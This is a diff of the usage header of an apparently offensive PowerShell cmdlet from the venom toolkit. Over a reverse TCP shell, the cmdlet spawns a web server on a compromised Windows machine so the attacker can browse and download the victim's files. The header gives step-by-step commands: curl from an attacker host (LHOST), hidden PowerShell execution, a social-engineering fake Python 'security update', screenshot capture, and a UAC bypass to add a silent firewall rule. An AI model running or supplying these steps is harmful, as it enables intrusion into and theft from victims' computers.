@@ -14,32 +14,27 @@
    to trick target user into installing Python-3.9.0.exe as a python security update
    (if target user does not have python installed). This cmdlet also has the ability
    to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
-   And uses curl native binary (LolBin) OR Start-BitsTransfer to download the correct
-   python windows installer architecture binary from www.python.org oficial webpage.
    The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)
 
    1º - Place this cmdlet in attacker machine apache2 webroot
-        execute: cp webserver.ps1 /var/www/html/webserver.ps1
+        cp webserver.ps1 /var/www/html/webserver.ps1
 
-   2º - Then upload webserver using the reverse tcp shell (prompt)
-        execute: cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
+   2º - Then upload webserver using the reverse tcp shell prompt
+        cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
 
-   3º - Then remote execute webserver using the reverse tcp shell (prompt)
-        execute: powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum True
+   3º - Then remote execute webserver using the reverse tcp shell prompt
+        powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose
 
    4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
 
 .NOTES
-   cmd /c taskkill /F /IM Python.exe
-   Kill remote Python process's (stop webserver|python)
-
    If executed with administrator privileges then this cmdlet add's
    one firewall rule that allow server silent connections. IF the shell
    does not have admin privs then 'ComputerDefaults.exe' EOP will be used
    to add the firewall rule to prevent 'incomming connections' warning.
 
    If executed without administrator privileges then this cmdlet
-   its limmited to directory ACL permissions (R)(W) attributes.
+   its limmited to directory ACL permissions (R)(W)(F) attributes.
    NOTE: 'Get-Acl' powershell cmdlet displays directory attributes.
 
 .EXAMPLE
@@ -49,10 +44,6 @@
 .EXAMPLE
    PS C:\> .\webserver.ps1
    Spawn webserver in '$Env:UserProfile' directory on port 8086
-
-.EXAMPLE
-   PS C:\> .\webserver.ps1 -SPath "C:\Users\pedro\Desktop"
-   Spawn webserver in the sellected directory on port 8086
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SPort 8111
@@ -121,6 +112,7 @@
     https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
     https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
 #>
+
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
